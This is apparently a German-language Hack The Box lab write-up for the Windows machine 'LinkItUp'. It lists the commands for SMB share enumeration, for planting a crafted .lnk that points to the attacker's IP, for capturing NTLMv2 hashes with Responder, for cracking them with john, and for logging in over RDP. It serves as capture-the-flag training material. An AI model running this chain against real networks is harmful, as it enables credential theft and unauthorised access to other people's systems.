---
tags: [htb, windows, easy, writeup]
cve: none (Mark of the Web, kein CVE)
techniques: [smb-enum, ntlm-leak, hash-cracking]
---
# LinkItUp (HTB)

| Feld               | Wert                                      |
| ------------------ | ----------------------------------------- |
| OS                 | Windows                                    |
| Difficulty         | Easy                                       |
| Box IP             | `10.129.234.64` (ändert sich bei Redeploy)|
| Attacker IP (tun0) | `<tun0-ip>`                                |

> [!info] Kill Chain
> [[SMB Enumeration]] (anon Share) → bösartige `.lnk` auf Share → Opfer-Rechtsklick löst [[NTLM Hash Leak]] aus → Hash via [[Responder]] gefangen → [[Hash Cracking]] (john) → Creds → RDP → **Flag**

> [!note] Die Lücke
> Rechtsklick auf eine präparierte `.lnk` leakt den **NTLMv2-Hash** (alle Windows-Versionen). Microsoft: durch *Mark of the Web* bei Internet-Downloads blockiert → **kein CVE**. Dateien auf **Shares** sind aber trotzdem verwundbar.

---

# 1 · Enumeration

## Ports → [[nmap]]
```bash
nmap -sV -sC 10.129.234.64
```

## Shares anonym → [[SMB Enumeration]]
```bash
smbclient -L //10.129.234.64/share -N
# => beschreibbarer Share gefunden
```

---

# 2 · Credential Access → [[NTLM Hash Leak]]

## 2.1 Bösartige `.lnk` bauen
`poc.c` so anpassen, dass die `.lnk` auf die **eigene IP** zeigt (`\\<tun0-ip>\share`).
```bash
x86_64-w64-mingw32-gcc -o poc poc.c   # unter Linux kompilieren => poc.exe
wine poc.exe                          # .exe ausführen => poc.lnk
```
> `mingw32-gcc` kompiliert Windows-Binaries unter Linux, `wine` führt sie aus.

## 2.2 `.lnk` auf den Share legen
```bash
smbclient //10.129.234.64/share -N -c 'put poc.lnk'
```

## 2.3 Hash abfangen → [[Responder]]
```bash
responder -I tun0 -P
# wartet auf SMB-Auth; Opfer-Rechtsklick => NTLMv2-Hash erscheint
```

## 2.4 Hash cracken → [[Hash Cracking]]
```bash
john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt
# => Klartext-Passwort
```

---

# 3 · Zugriff → Flag

```bash
xfreerdp3 /v:10.129.234.64 /u:<user> /p:<password> /cert:ignore
# => Desktop, Flag auslesen
```
